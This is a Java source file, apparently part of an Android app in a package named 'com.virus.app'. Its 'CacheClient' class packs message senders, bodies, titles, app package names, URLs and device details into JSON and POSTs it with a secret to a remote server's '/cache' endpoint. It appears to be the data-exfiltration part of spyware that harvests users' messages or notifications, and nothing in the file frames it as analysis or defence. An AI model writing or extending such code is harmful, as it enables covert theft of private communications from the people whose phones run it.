package com.virus.app;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class CacheClient {

    private final String serverUrl;
    private final String secret;

    public CacheClient(String serverUrl, String secret) {
        this.serverUrl = serverUrl;
        this.secret = secret;
    }

    public void save(String hash, String type,
                     String sender, String body,
                     String title, String pkg,
                     String url,
                     String device, String android) throws Exception {

        StringBuilder data = new StringBuilder("{");
        if (sender != null) data.append("\"sender\":\"").append(escape(sender)).append("\",");
        if (body != null) data.append("\"body\":\"").append(escape(body)).append("\",");
        if (title != null) data.append("\"title\":\"").append(escape(title)).append("\",");
        if (pkg != null) data.append("\"package\":\"").append(escape(pkg)).append("\",");
        if (device != null) data.append("\"device\":\"").append(escape(device)).append("\",");
        if (android != null) data.append("\"android\":\"").append(escape(android)).append("\",");

        // Убираем последнюю запятую
        String dataStr = data.toString();
        if (dataStr.endsWith(",")) dataStr = dataStr.substring(0, dataStr.length() - 1);
        dataStr += "}";

        String json = "{" +
            "\"secret\":\"" + escape(secret) + "\"," +
            "\"hash\":\"" + hash + "\"," +
            "\"type\":\"" + type + "\"," +
            "\"url\":\"" + escape(url != null ? url : "") + "\"," +
            "\"data\":" + dataStr +
            "}";

        URL reqUrl = new URL(serverUrl + "/cache");
        HttpURLConnection conn = (HttpURLConnection) reqUrl.openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
        conn.setDoOutput(true);
        conn.setConnectTimeout(5000);
        conn.setReadTimeout(5000);

        try (OutputStream os = conn.getOutputStream()) {
            os.write(json.getBytes(StandardCharsets.UTF_8));
        }

        conn.getResponseCode();
        conn.disconnect();
    }

    private String escape(String s) {
        return s.replace("\\", "\\\\")
                .replace("\"", "\\\"")
                .replace("\n", "\\n")
                .replace("\r", "\\r");
    }
}
